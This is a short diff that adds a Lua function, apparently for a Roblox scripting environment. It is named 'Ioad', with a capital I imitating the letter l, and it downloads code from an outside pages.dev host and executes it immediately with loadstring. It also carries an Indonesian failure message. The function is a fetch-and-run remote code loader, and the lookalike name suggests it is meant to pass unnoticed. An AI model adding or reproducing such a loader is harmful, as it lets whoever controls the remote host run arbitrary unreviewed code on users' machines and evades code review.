@@ -1,0 +1,10 @@
+function Ioad(name)
+    local s, e = pcall(function()
+        local url = "https://loader-5xf.pages.dev/" .. name
+        local response = game:HttpGet(url)
+        return loadstring(response)()
+    end)
+    if not s then
+        warn("Gagal memuat script: "..tostring(e))
+    end
+end
